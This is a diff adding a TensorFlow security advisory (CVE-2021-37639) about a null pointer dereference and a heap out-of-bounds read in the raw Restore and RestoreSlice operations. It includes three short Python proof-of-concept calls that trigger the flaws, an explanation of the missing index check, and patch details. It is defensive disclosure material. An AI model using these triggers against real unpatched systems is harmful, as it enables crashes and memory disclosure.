@@ -1,0 +1,59 @@
+<h2>TFSA-2021-113: Null pointer dereference and heap OOB read in operations restoring tensors</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37639</p>
+<h3>Impact</h3>
+<p>When restoring tensors via raw APIs, if the tensor name is not provided,
+TensorFlow can be tricked into dereferencing a null pointer:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.Restore(
+  file_pattern=['/tmp'],
+  tensor_name=[],
+  default_value=21,
+  dt=tf.int,
+  preferred_shard=1)
+```</p>
+<p>The same undefined behavior can be triggered by <code>tf.raw_ops.RestoreSlice</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.RestoreSlice(
+  file_pattern=['/tmp'],
+  tensor_name=[],
+  shape_and_slice='2',
+  dt=inp.array([tf.int]),
+  preferred_shard=1)
+```</p>
+<p>Alternatively, attackers can read memory outside the bounds of heap allocated
+data by providing some tensor names but not enough for a successful restoration:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.Restore(
+  file_pattern=['/tmp'],
+  tensor_name=['x'],
+  default_value=21,
+  dt=tf.int,
+  preferred_shard=42)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159">implementation</a>
+retrieves the tensor list corresponding to the <code>tensor_name</code> user controlled
+input and immediately retrieves the tensor at the restoration index (controlled
+via <code>preferred_shard</code> argument). This occurs without validating that the
+provided list has enough values.</p>
+<p>If the list is empty this results in dereferencing a null pointer (undefined
+behavior). If, however, the list has some elements, if the restoration index is
+outside the bounds this results in heap OOB read.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622">9e82dce6e6bd1f36a57e08fa85af213e2b2f2622</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by members of the Aivul Team from Qihoo
+360.</p>
